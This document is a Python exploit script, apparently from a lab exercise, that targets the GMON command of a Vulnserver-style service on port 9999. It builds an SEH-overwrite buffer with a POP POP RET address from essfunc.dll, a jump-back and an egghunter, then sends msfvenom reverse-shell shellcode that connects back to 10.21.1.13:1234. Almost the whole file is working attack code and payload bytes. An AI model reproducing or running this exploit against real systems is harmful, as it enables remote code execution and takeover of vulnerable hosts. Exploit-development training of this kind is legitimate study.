#!/usr/bin/python
import sys, socket

ip = '10.21.1.15'
port = 9999

# Badchars: \x00

# Use !mona seh to find POP POP RET instructions
# POP POP RET: \x625010B4 - essfunc.dll

nseh = "\xEB\xD9\x90\x90" # Jump back
seh = "\xB4\x10\x50\x62" # POP POP RET

egghunter = (
    "\x66\x81\xca\xff\x0f\x42\x52\x6a"
    "\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x77\x30\x30\x74\x8b\xfa"
    "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.21.1.13 LPORT=1234 -b '\x00' -f python -v shellcode

shellcode =  b""
shellcode += b"\xda\xc6\xba\x81\x66\x7a\xf7\xd9\x74\x24\xf4"
shellcode += b"\x5f\x33\xc9\xb1\x52\x31\x57\x17\x03\x57\x17"
shellcode += b"\x83\x6e\x9a\x98\x02\x8c\x8b\xdf\xed\x6c\x4c"
shellcode += b"\x80\x64\x89\x7d\x80\x13\xda\x2e\x30\x57\x8e"
shellcode += b"\xc2\xbb\x35\x3a\x50\xc9\x91\x4d\xd1\x64\xc4"
shellcode += b"\x60\xe2\xd5\x34\xe3\x60\x24\x69\xc3\x59\xe7"
shellcode += b"\x7c\x02\x9d\x1a\x8c\x56\x76\x50\x23\x46\xf3"
shellcode += b"\x2c\xf8\xed\x4f\xa0\x78\x12\x07\xc3\xa9\x85"
shellcode += b"\x13\x9a\x69\x24\xf7\x96\x23\x3e\x14\x92\xfa"
shellcode += b"\xb5\xee\x68\xfd\x1f\x3f\x90\x52\x5e\x8f\x63"
shellcode += b"\xaa\xa7\x28\x9c\xd9\xd1\x4a\x21\xda\x26\x30"
shellcode += b"\xfd\x6f\xbc\x92\x76\xd7\x18\x22\x5a\x8e\xeb"
shellcode += b"\x28\x17\xc4\xb3\x2c\xa6\x09\xc8\x49\x23\xac"
shellcode += b"\x1e\xd8\x77\x8b\xba\x80\x2c\xb2\x9b\x6c\x82"
shellcode += b"\xcb\xfb\xce\x7b\x6e\x70\xe2\x68\x03\xdb\x6b"
shellcode += b"\x5c\x2e\xe3\x6b\xca\x39\x90\x59\x55\x92\x3e"
shellcode += b"\xd2\x1e\x3c\xb9\x15\x35\xf8\x55\xe8\xb6\xf9"
shellcode += b"\x7c\x2f\xe2\xa9\x16\x86\x8b\x21\xe6\x27\x5e"
shellcode += b"\xe5\xb6\x87\x31\x46\x66\x68\xe2\x2e\x6c\x67"
shellcode += b"\xdd\x4f\x8f\xad\x76\xe5\x6a\x26\x73\xef\x75"
shellcode += b"\xbb\xeb\x0d\x75\xc7\x39\x98\x93\xad\xad\xcd"
shellcode += b"\x0c\x5a\x57\x54\xc6\xfb\x98\x42\xa3\x3c\x12"
shellcode += b"\x61\x54\xf2\xd3\x0c\x46\x63\x14\x5b\x34\x22"
shellcode += b"\x2b\x71\x50\xa8\xbe\x1e\xa0\xa7\xa2\x88\xf7"
shellcode += b"\xe0\x15\xc1\x9d\x1c\x0f\x7b\x83\xdc\xc9\x44"
shellcode += b"\x07\x3b\x2a\x4a\x86\xce\x16\x68\x98\x16\x96"
shellcode += b"\x34\xcc\xc6\xc1\xe2\xba\xa0\xbb\x44\x14\x7b"
shellcode += b"\x17\x0f\xf0\xfa\x5b\x90\x86\x02\xb6\x66\x66"
shellcode += b"\xb2\x6f\x3f\x99\x7b\xf8\xb7\xe2\x61\x98\x38"
shellcode += b"\x39\x22\xb8\xda\xeb\x5f\x51\x43\x7e\xe2\x3c"
shellcode += b"\x74\x55\x21\x39\xf7\x5f\xda\xbe\xe7\x2a\xdf"
shellcode += b"\xfb\xaf\xc7\xad\x94\x45\xe7\x02\x94\x4f"

egg = "w00tw00t" + shellcode 

fuzz = egg + "A" * (3515 - len(egg) - len(egghunter) - 5) + egghunter + "A" * 5
remain = "D" * (4100 - 3547 - len(nseh) - len(seh))

buffer = fuzz + nseh + seh + remain

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(('GMON /.:/' + buffer))
    print("[+] Sending buffer")
    s.close()
except:
    print("[-] Failed!")
    sys.exit()
